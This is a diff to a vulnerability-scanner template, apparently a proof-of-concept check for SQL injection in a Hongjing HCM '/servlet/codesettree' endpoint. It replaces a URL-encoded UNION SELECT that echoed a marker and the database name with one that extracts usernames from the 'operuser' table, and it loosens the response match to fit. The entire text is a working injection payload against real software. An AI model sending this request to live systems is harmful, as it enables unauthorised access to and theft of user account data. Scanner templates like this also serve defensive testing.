@@ -19,10 +19,9 @@ rules:
   r0:
     request:
       method: GET
-      path: /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d
     expression: |
       response.status == 200 && 
-      response.body.bcontains(b'<TreeNode') &&
-      response.body.bcontains(b'id="hellohongjingHcm"') &&
-      response.body.bcontains(b'text="hellohongjingHcm')
+      response.body.bcontains(b'TreeNode id=') &&
+      response.body.bcontains(b'text=')
 expression: r0()
